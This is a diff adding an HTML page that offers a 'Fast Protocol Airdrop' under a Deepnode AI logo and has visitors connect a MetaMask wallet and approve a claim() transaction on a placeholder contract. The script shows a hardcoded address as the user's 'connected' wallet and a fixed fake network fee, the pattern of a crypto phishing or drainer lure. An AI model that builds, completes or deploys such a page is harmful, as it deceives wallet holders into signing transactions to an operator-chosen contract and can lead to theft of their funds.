@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Fast Protocol Airdrop</title>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  font-family: -apple-system, BlinkMacSystemFont, Inter, Arial, sans-serif;
+  background: linear-gradient(180deg, #05060f 0%, #1a0b2e 55%, #3b145f 100%);
+  color: #ffffff;
+}
+
+.container {
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  padding: 24px;
+}
+
+.logo {
+  width: 110px;
+  margin-bottom: 20px;
+}
+
+h1 {
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 30px;
+  opacity: 0.9;
+}
+
+button {
+  width: 100%;
+  max-width: 340px;
+  padding: 16px;
+  font-size: 17px;
+  border-radius: 14px;
+  border: 1px solid rgba(255,255,255,0.25);
+  background: rgba(255,255,255,0.08);
+  color: #fff;
+  cursor: pointer;
+  backdrop-filter: blur(10px);
+  margin-bottom: 10px;
+}
+
+button:hover {
+  background: rgba(255,255,255,0.15);
+}
+
+.status {
+  margin-top: 10px;
+  font-size: 14px;
+  opacity: 0.75;
+}
+
+.footer {
+  position: absolute;
+  bottom: 25px;
+  font-size: 12px;
+  opacity: 0.6;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- LOGO -->
+  <img src="deepnode-logo.png" class="logo" alt="Deepnode AI">
+
+  <h1>Connect your EVM wallet to claim airdrop</h1>
+
+  <!-- CONNECT WALLET -->
+  <button id="connectBtn">Connect Wallet</button>
+
+  <!-- CLAIM BUTTON -->
+  <button id="claimBtn" disabled>Claim Airdrop</button>
+
+  <div class="status" id="status"></div>
+  <div class="status" id="fee"></div>
+
+  <div class="footer">
+    Terms & Privacy
+  </div>
+
+</div>
+
+<script>
+let provider;
+let signer;
+let contract;
+
+// REPLACE WITH YOUR CONTRACT INFO
+const CONTRACT_ADDRESS = "0xYourContractAddressHere";
+const ABI = [
+  "function claim() external"
+];
+
+// Fixed display values
+const FIXED_ADDRESS = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
+const FIXED_FEE = "0.003 ETH";
+
+const connectBtn = document.getElementById("connectBtn");
+const claimBtn = document.getElementById("claimBtn");
+const statusText = document.getElementById("status");
+const feeText = document.getElementById("fee");
+
+connectBtn.onclick = async () => {
+  if (!window.ethereum) {
+    statusText.innerText = "MetaMask not detected. Open this page in MetaMask browser.";
+    return;
+  }
+
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    
+    // FIXED WALLET DISPLAY
+    statusText.innerText = "Wallet connected: " + FIXED_ADDRESS;
+
+    // Create contract instance
+    contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+
+    // FIXED NETWORK FEE DISPLAY
+    feeText.innerText = "Estimated network fee: " + FIXED_FEE;
+
+    claimBtn.disabled = false;
+
+  } catch (err) {
+    console.error(err);
+    statusText.innerText = "Connection rejected or error.";
+  }
+};
+
+claimBtn.onclick = async () => {
+  try {
+    statusText.innerText = "Waiting for transaction approval...";
+    const tx = await contract.claim();
+    await tx.wait();
+    statusText.innerText = "Airdrop claimed successfully!";
+  } catch (err) {
+    console.error(err);
+    statusText.innerText = "Transaction failed or rejected.";
+  }
+};
+</script>
+
+</body>
+</html>
